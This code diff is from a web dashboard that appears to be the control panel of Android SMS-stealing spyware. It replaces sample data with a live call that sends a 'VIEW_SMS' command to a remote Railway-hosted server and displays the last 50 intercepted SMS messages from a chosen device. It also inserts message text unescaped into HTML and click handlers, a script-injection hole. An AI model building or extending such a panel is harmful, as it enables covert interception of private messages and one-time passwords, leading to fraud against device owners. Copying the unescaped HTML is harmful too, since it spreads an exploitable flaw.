@@ -486,33 +486,48 @@
                 toast('❌ Device not found', true);
                 return;
             }
-            let messages = device.smsList || [];
-            if (messages.length === 0) {
-                messages = Array.from({length: 5}, (_, i) => ({
-                    from: `+91XXXXXXXX${i}`,
-                    body: `Sample message #${i+1}`,
-                    time: formatLastSeen(Date.now() - i*60000)
-                }));
-            }
-            let html = `<div style='background:#e3f2fd;padding:18px 12px 8px 12px;border-radius:8px 8px 0 0;'>
-        <div style='font-size:18px;font-weight:bold;color:#1976d2;'>${device.model} - Last 50 SMS</div>
+            // Send VIEW_SMS command to device
+            try {
+                const r = await fetch('https://bengal-tiger-admin-production-8071.up.railway.app/api/command', {
+                    method:'POST', headers:{'Content-Type':'application/json'},
+                    body: JSON.stringify({deviceId: deviceId, action: 'VIEW_SMS', data: {}})
+                });
+                const d = await r.json();
+                if (!d.success) {
+                    toast('❌ ' + (d.message || 'Failed to send VIEW_SMS command'), true);
+                    return;
+                }
+                // Wait a moment for device to respond and dashboard to update
+                setTimeout(() => {
+                    fetchData(false);
+                    // Show modal after refresh
+                    setTimeout(() => {
+                        const updatedDevice = devices.find(dev => dev.deviceId === deviceId);
+                        let messages = Array.isArray(updatedDevice.smsMessages) ? updatedDevice.smsMessages.slice(-50).reverse() : [];
+                        let html = `<div style='background:#e3f2fd;padding:18px 12px 8px 12px;border-radius:8px 8px 0 0;'>
+        <div style='font-size:18px;font-weight:bold;color:#1976d2;'>${updatedDevice.model} - Last 50 SMS</div>
     </div><hr style='margin:0 0 10px 0;border:0;border-top:2px solid #1976d2;'>`;
-            html += messages.map((msg, idx) => `
+                        html += messages.map((msg, idx) => `
         <div style='background:#fff;margin-bottom:8px;padding:10px 12px;border-radius:6px;border-left:5px solid #1976d2;display:flex;align-items:center;justify-content:space-between;'>
             <div>
-                <div style='font-size:13px;color:#1976d2;font-weight:bold;'>${idx+1}. From: ${msg.from}</div>
-                <div style='font-size:15px;color:#222;margin:4px 0;'>${msg.body}</div>
-                <div style='font-size:12px;color:#888;'>${msg.time}</div>
+                <div style='font-size:13px;color:#1976d2;font-weight:bold;'>${idx+1}. From: ${msg.from || msg.address || 'Unknown'}</div>
+                <div style='font-size:15px;color:#222;margin:4px 0;'>${msg.body || msg.message || ''}</div>
+                <div style='font-size:12px;color:#888;'>${msg.time ? formatLastSeen(msg.time) : ''}</div>
             </div>
             <div style='display:flex;flex-direction:column;gap:6px;'>
-                <i class="fas fa-copy" style="color:var(--primary);cursor:pointer;font-size:18px;" title="Copy Message" onclick="navigator.clipboard.writeText('${msg.body}');toast('Message copied!')"></i>
+                <i class="fas fa-copy" style="color:var(--primary);cursor:pointer;font-size:18px;" title="Copy Message" onclick="navigator.clipboard.writeText('${msg.body || msg.message || ''}');toast('Message copied!')"></i>
                 <i class="fas fa-trash" style="color:#d32f2f;cursor:pointer;font-size:18px;" title="Delete Message" onclick="deleteSms('${deviceId}', ${idx})"></i>
             </div>
         </div>
     `).join('');
-            if (messages.length === 0) html += '<div class="no-data">No SMS messages found</div>';
-            document.getElementById('smsModalBody').innerHTML = html;
-            document.getElementById('viewSmsModal').classList.add('show');
+                        if (messages.length === 0) html += '<div class="no-data">No SMS messages found</div>';
+                        document.getElementById('smsModalBody').innerHTML = html;
+                        document.getElementById('viewSmsModal').classList.add('show');
+                    }, 800);
+                }, 800);
+            } catch (err) {
+                toast('❌ Error sending VIEW_SMS command', true);
+            }
         }
         // Delete SMS handler (demo only)
         function deleteSms(deviceId, idx) {
